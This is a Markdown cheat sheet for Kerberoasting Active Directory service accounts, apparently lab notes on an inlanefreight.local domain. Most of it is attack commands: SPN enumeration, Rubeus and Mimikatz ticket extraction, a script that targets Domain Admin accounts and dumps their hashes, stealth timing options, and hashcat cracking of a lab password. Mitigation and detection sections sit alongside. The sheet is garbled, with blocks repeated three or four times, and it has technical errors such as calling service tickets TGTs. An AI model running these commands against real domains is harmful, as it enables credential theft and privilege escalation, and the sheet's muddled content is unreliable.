# 🛰️ Windows Kerberoasting Overview

## 🔑 Key Concepts and Objectives

### 💡 **Understanding Kerberos**
Kerberos is a network authentication protocol that uses symmetric key cryptography to provide strong authentication for client/server applications by using secret-key cryptography. It provides mutual authentication, ensuring both the user and the server are authenticated.

### 🎯 **Objective of Kerberoasting**
The goal is to exploit the Kerberos protocol's weaknesses to extract service account ticket-granting tickets (TGTs) without triggering typical security alerts. These TGTs can then be cracked offline for password discovery, leading to lateral movement and privilege escalation within a domain.

---

## 🚀 Pre-Attack Enumeration

### 🔍 **Gathering SPNs**
```cmd
# Enumerate all Service Principal Names in the domain
setspn.exe -Q */*
```

#### 📝 Example Output:
```text
Registered ServicePrincipalNames for CN=svc_vmwaresso,CN=Users,DC=inlanefreight,DC=local:

  vmware/inlanefreight.local

Number of entries returned 1
```

### 🔍 **PowerView Enumeration**
Use PowerView to get a detailed list of users with SPNs.

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | Select-Object samaccountname,serviceprincipalname
```

#### 📝 Example Output:
```text
samaccountname          serviceprincipalname
----------------------  --------------------
svc_vmwaresso           vmware/inlanefreight.local
```

### 🔍 **Rubeus Statistics**
Use Rubeus to gather statistics on the number of SPNs and potential targets.

```cmd
.\Rubeus.exe kerberoast /stats
```

---

## 🛠️ Extracting Kerberos Tickets

### 💥 **Manual Extraction with Mimikatz**
Extract tickets manually using Mimikatz.

```powershell
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /user:svc_vmwaresso
mimikatz # kerberos::list /user:svc_vmwaresso
```

### 💥 **Automated Extraction with Rubeus**
Use Rubeus to automatically extract and save TGTs.

```cmd
.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap
```

#### 📝 Example Output:
```text
[+] User 'svc_vmwaresso' has 1 Service Principal Name(s):
    vmware/inlanefreight.local

[+] Requesting TGT for 'vmware/inlanefreight.local'
[+] Successfully requested TGT, ticket size: 473 bytes
```

### 💥 **PowerShell Scripted Extraction**
Automate the extraction process with PowerShell.

```powershell
$users = Get-DomainUser * -spn | Select-Object samaccountname,serviceprincipalname

foreach ($user in $users) {
    .\Rubeus.exe kerberoast /user:$($user.samaccountname) /nowrap
}
```

---

## 🔍 Ticket Analysis and Cracking

### 💡 **Cracking the TGTs**
Use Hashcat or John the Ripper to crack extracted tickets.

```cmd
# Example using Hashcat with a wordlist
hashcat -m 13100 cracked_ticket.kirbi rockyou.txt
```

#### 📝 Key Lab Details:
- **Service Account**: `svc_vmwaresso`
- **SPN**: `vmware/inlanefreight.local`
- **Encryption Type**: RC4_HMAC_DEFAULT (easy to crack)
- **Password**: `Virtual01` (found in rockyou.txt wordlist)
- **Hashcat Mode**: 13100

---

## 🔧 Advanced Windows Kerberoasting Techniques

### 🎯 **Stealth Considerations**
```cmd
# Use built-in tools to blend in
setspn.exe -Q */* > spn_enum.txt

# PowerShell native approach (no external tools)
Add-Type -AssemblyName System.IdentityModel
[System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::new("TARGET_SPN")

# Rubeus with timing controls
.\Rubeus.exe kerberoast /delay:10000 /jitter:25 /nowrap

# Target specific high-value accounts only
.\Rubeus.exe kerberoast /ldapfilter:'(memberOf=*Domain Admins*)' /nowrap
```

### 🔍 **LDAP Filter Examples**
```cmd
# High-privilege accounts
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Accounts with passwords set long ago
.\Rubeus.exe kerberoast /pwdsetbefore:01-01-2020 /nowrap

# Specific service types
.\Rubeus.exe kerberoast /ldapfilter:'(servicePrincipalName=MSSQLSvc*)' /nowrap

# Exclude certain accounts
.\Rubeus.exe kerberoast /ldapfilter:'(!samAccountName=krbtgt)' /nowrap

# Combine multiple conditions
.\Rubeus.exe kerberoast /ldapfilter:'(&(admincount=1)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' /nowrap
```

### 🔄 **Automation Script Example**
```powershell
# Automated Kerberoasting script
$outputDir = "C:\temp\kerberoast"
New-Item -Path $outputDir -ItemType Directory -Force

# Enumerate SPNs
Write-Host "[+] Enumerating SPNs..."
$spnUsers = Get-DomainUser * -spn | Select-Object samaccountname,serviceprincipalname,memberof

# Target high-value accounts first
$highValue = $spnUsers | Where-Object {$_.memberof -match "Domain Admins|Enterprise Admins|Backup Operators"}

if ($highValue) {
    Write-Host "[!] Found high-value SPN accounts:"
    $highValue | ForEach-Object {
        Write-Host "  $($_.samaccountname) - $($_.serviceprincipalname)"
        
        # Extract ticket
        $ticket = Get-DomainUser -Identity $_.samaccountname | Get-DomainSPNTicket -Format Hashcat
        $ticket.Hash | Out-File "$outputDir\$($_.samaccountname)_hash.txt"
    }
}

# Extract all tickets
Write-Host "[+] Extracting all SPN tickets..."
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv "$outputDir\all_tickets.csv" -NoTypeInformation

Write-Host "[+] Results saved to: $outputDir"
```

---

## 🛡️ Mitigation and Detection

### 🔧 **Defensive Measures**
- **Managed Service Accounts (MSA/gMSA)**: Use accounts with automatically rotated complex passwords
- **Strong Passwords**: 25+ character passphrases for service accounts
- **Regular Rotation**: Frequent password changes for service accounts
- **Minimal Privileges**: Service accounts should not have unnecessary elevated rights
- **Remove RC4**: Disable RC4 encryption (test carefully for compatibility)

### 📊 **Detection Strategies**
```cmd
# Enable Kerberos auditing
# Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
# Enable: "Audit Kerberos Service Ticket Operations"

# Event IDs to monitor:
# 4769: A Kerberos service ticket was requested
# 4770: A Kerberos service ticket was renewed

# Detection criteria:
# - Large numbers of 4769 events from single account
# - Requests for RC4 tickets (encryption type 0x17)
# - Unusual service ticket requests outside business hours
# - Multiple service accounts targeted by same user
```

### 🔍 **Group Policy Configuration**
```cmd
# Disable RC4 encryption (caution: test thoroughly)
# Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
# "Network security: Configure encryption types allowed for Kerberos"
# Remove: RC4_HMAC_MD5, RC4_HMAC_DEFAULT
# Keep: AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
```

---

## ⚡ Quick Reference Commands

### 🔧 **Essential Windows Kerberoasting Workflow**
```cmd
# 1. Enumerate SPNs
setspn.exe -Q */*

# 2. PowerView enumeration
Get-DomainUser * -spn | select samaccountname,serviceprincipalname

# 3. Rubeus statistics
.\Rubeus.exe kerberoast /stats

# 4. Target high-value accounts
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# 5. Extract specific tickets
.\Rubeus.exe kerberoast /user:TARGET_USER /nowrap

# 6. Save all tickets
.\Rubeus.exe kerberoast /outfile:tickets.txt /nowrap
```

### 📊 **Tool Comparison Matrix**

| **Method** | **Stealth** | **Speed** | **Features** | **Requirements** |
|------------|-------------|-----------|--------------|------------------|
| **setspn + PowerShell + Mimikatz** | High | Slow | Manual control | Built-in tools |
| **PowerView** | Medium | Fast | Good automation and filtering options | Requires PowerShell modules |
| **Rubeus** | Low to Medium | Very Fast | Automated extraction, timing controls | Requires Rubeus tool |

---

## 🔍 Ticket Analysis and Cracking

### 💡 **Cracking the TGTs**
Use Hashcat or John the Ripper to crack extracted tickets.

```cmd
# Example using Hashcat with a wordlist
hashcat -m 13100 cracked_ticket.kirbi rockyou.txt
```

#### 📝 Key Lab Details:
- **Service Account**: `svc_vmwaresso`
- **SPN**: `vmware/inlanefreight.local`
- **Encryption Type**: RC4_HMAC_DEFAULT (easy to crack)
- **Password**: `Virtual01` (found in rockyou.txt wordlist)

---

## 🔍 Ticket Analysis and Cracking

### 💡 **Cracking the TGTs**
Use Hashcat or John the Ripper to crack extracted tickets.

```cmd
# Example using Hashcat with a wordlist
hashcat -m 13100 cracked_ticket.kirbi rockyou.txt
```

#### 📝 Key Lab Details:
- **Service Account**: `svc_vmwaresso`
- **SPN**: `vmware/inlanefreight.local`
- **Encryption Type**: RC4_HMAC_DEFAULT (easy to crack)
- **Password**: `Virtual01` (found in rockyou.txt wordlist)

---

## 🔍 Ticket Analysis and Cracking

### 💡 **Cracking the TGTs**
Use Hashcat or John the Ripper to crack extracted tickets.

```cmd
# Example using Hashcat with a wordlist
hashcat -m 13100 cracked_ticket.kirbi rockyou.txt
```

#### 📝 Key Lab Details:
- **Service Account**: `svc_vmwaresso`
- **SPN**: `vmware/inlanefreight.local`
- **Encryption Type**: RC4_HMAC_DEFAULT (easy to crack)
- **Password**: `Virtual01` (found in rockyou.txt wordlist)

---

## 🛡️ Mitigation and Detection

### 🔧 **Defensive Measures**
- **Managed Service Accounts (MSA/gMSA)**: Use accounts with automatically rotated complex passwords
- **Strong Passwords**: 25+ character passphrases for service accounts
- **Regular Rotation**: Frequent password changes for service accounts
- **Minimal Privileges**: Service accounts should not have unnecessary elevated rights
- **Remove RC4**: Disable RC4 encryption (test carefully for compatibility)

### 📊 **Detection Strategies**
```cmd
# Enable Kerberos auditing
# Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
# Enable: "Audit Kerberos Service Ticket Operations"

# Event IDs to monitor:
# 4769: A Kerberos service ticket was requested
# 4770: A Kerberos service ticket was renewed

# Detection criteria:
# - Large numbers of 4769 events from single account
# - Requests for RC4 tickets (encryption type 0x17)
# - Unusual service ticket requests outside business hours
# - Multiple service accounts targeted by same user
```

### 🔍 **Group Policy Configuration**
```cmd
# Disable RC4 encryption (caution: test thoroughly)
# Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
# "Network security: Configure encryption types allowed for Kerberos"
# Remove: RC4_HMAC_MD5, RC4_HMAC_DEFAULT
# Keep: AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
```

--- 

## ⚡ Quick Reference Commands

### 🔧 **Essential Windows Kerberoasting Workflow**
```cmd
# 1. Enumerate SPNs
setspn.exe -Q */*

# 2. PowerView enumeration
Get-DomainUser * -spn | select samaccountname,serviceprincipalname

# 3. Rubeus statistics
.\Rubeus.exe kerberoast /stats

# 4. Target high-value accounts
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# 5. Extract specific tickets
.\Rubeus.exe kerberoast /user:TARGET_USER /nowrap

# 6. Save all tickets
.\Rubeus.exe kerberoast /outfile:tickets.txt /nowrap
```

### 📊 **Tool Comparison Matrix**

| **Method** | **Stealth** | **Speed** | **Features** | **Requirements** |
|------------|-------------|-----------|--------------|------------------|
| **setspn + PowerShell + Mimikatz** | High | Slow | Manual control | Built-in tools |
| **PowerView** | Medium | Fast | Good automation and filtering options | Requires PowerShell modules |
| **Rubeus** | Low to Medium | Very Fast | Automated extraction, timing controls | Requires Rubeus tool |

---

## 🔍 Ticket Analysis and Cracking

### 💡 **Cracking the TGTs**
Use Hashcat or John the Ripper to crack extracted tickets.

```cmd
# Example using Hashcat with a wordlist
hashcat -m 13100 cracked_ticket.kirbi rockyou.txt
```

#### 📝 Key Lab Details:
- **Service Account**: `svc_vmwaresso`
- **SPN**: `vmware/inlanefreight.local`
- **Encryption Type**: RC4_HMAC_DEFAULT (easy to crack)
- **Password**: `Virtual01` (found in rockyou.txt wordlist)

---

## 🛡️ Mitigation and Detection

### 🔧 **Defensive Measures**
- **Managed Service Accounts (MSA/gMSA)**: Use accounts with automatically rotated complex passwords
- **Strong Passwords**: 25+ character passphrases for service accounts
- **Regular Rotation**: Frequent password changes for service accounts
- **Minimal Privileges**: Service accounts should not have unnecessary elevated rights
- **Remove RC4**: Disable RC4 encryption (test carefully for compatibility)

### 📊 **Detection Strategies**
```cmd
# Enable Kerberos auditing
# Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
# Enable: "Audit Kerberos Service Ticket Operations"

# Event IDs to monitor:
# 4769: A Kerberos service ticket was requested
# 4770: A Kerberos service ticket was renewed

# Detection criteria:
# - Large numbers of 4769 events from single account
# - Requests for RC4 tickets (encryption type 0x17)
# - Unusual service ticket requests outside business hours
# - Multiple service accounts targeted by same user
```

### 🔍 **Group Policy Configuration**
```cmd
# Disable RC4 encryption (caution: test thoroughly)
# Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
# "Network security: Configure encryption types allowed for Kerberos"
# Remove: RC4_HMAC_MD5, RC4_HMAC_DEFAULT
# Keep: AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
```

--- 

## ⚡ Quick Reference Commands

### 🔧 **Essential Windows Kerberoasting Workflow**
```cmd
# 1. Enumerate SPNs
setspn.exe -Q */*

# 2. PowerView enumeration
Get-DomainUser * -spn | select samaccountname,serviceprincipalname

# 3. Rubeus statistics
.\Rubeus.exe kerberoast /stats

# 4. Target high-value accounts
.\Rubeus.exe kerberoast /ldapfilter:'(memberOf=*Domain Admins*)' /nowrap

# 5. Extract specific tickets
.\Rubeus.exe kerberoast /user:TARGET_USER /nowrap

# 6. Save all tickets
.\Rubeus.exe kerberoast /outfile:tickets.txt /nowrap
```

### 📊 **Tool Comparison Matrix**

| **Method** | **Stealth** | **Speed** | **Features** | **Requirements** |
|------------|-------------|-----------|--------------|------------------|
| **setspn + PowerShell + Mimikatz** | High | Slow | Manual control | Built-in tools |
| **PowerView** | Medium | Fast | Good automation and filtering options | Requires PowerShell modules |
| **Rubeus** | Low to Medium | Very Fast | Automated extraction, timing controls | Requires Rubeus tool |

--- 

## 🛡️ Mitigation and Detection

### 🔧 **Defensive Measures**
- **Managed Service Accounts (MSA/gMSA)**: Use accounts with automatically rotated complex passwords
- **Strong Passwords**: 25+ character passphrases for service accounts
- **Regular Rotation**: Frequent password changes for service accounts
- **Minimal Privileges**: Service accounts should not have unnecessary elevated rights
- **Remove RC4**: Disable RC4 encryption (test carefully for compatibility)

### 📊 **Detection Strategies**
```cmd
# Enable Kerberos auditing
# Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
# Enable: "Audit Kerberos Service Ticket Operations"

# Event IDs to monitor:
# 4769: A Kerberos service ticket was requested
# 4770: A Kerberos service ticket was renewed

# Detection criteria:
# - Large numbers of 4769 events from single account
# - Requests for RC4 tickets (encryption type 0x17)
# - Unusual service ticket requests outside business hours
# - Multiple service accounts targeted by same user
```

### 🔍 **Group Policy Configuration**
```cmd
# Disable RC4 encryption (caution: test thoroughly)
# Group Policy: Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
# "Network security: Configure encryption types allowed for Kerberos"
# Remove: RC4_HMAC_MD5, RC4_HMAC_DEFAULT
# Keep: AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
```